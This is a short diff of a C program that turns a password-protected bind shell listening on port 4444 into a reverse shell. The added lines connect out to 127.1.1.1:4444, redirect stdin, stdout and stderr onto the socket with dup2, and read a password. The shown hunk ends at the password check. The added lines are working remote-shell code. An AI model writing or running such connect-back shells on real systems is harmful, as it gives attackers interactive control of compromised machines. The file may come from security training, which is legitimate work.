@@ -14,21 +14,17 @@ int main(int argc, char **argv)
 	struct sockaddr_in address = {
 		.sin_family = AF_INET,
 		.sin_port = htons(4444),
-		.sin_addr = INADDR_ANY
+		.sin_addr = inet_addr("127.1.1.1")
 	};
 
-	bind(sockfd, (struct sockaddr*) &address, sizeof(address));
+	connect(sockfd, (struct sockaddr*) &address, sizeof(address));
 
-	listen(sockfd, 0);
-
-	int acceptfd = accept(sockfd, NULL, NULL);
-	
-	dup2(acceptfd, 0);
-        dup2(acceptfd, 1);
-        dup2(acceptfd, 2);
+	dup2(sockfd, 0);
+        dup2(sockfd, 1);
+        dup2(sockfd, 2);
 
 	char pass[64];
-	read(acceptfd, pass, 64);
+	read(sockfd, pass, 64);
 	
 	if (strncmp(pass, p, length) == 0)
 	{
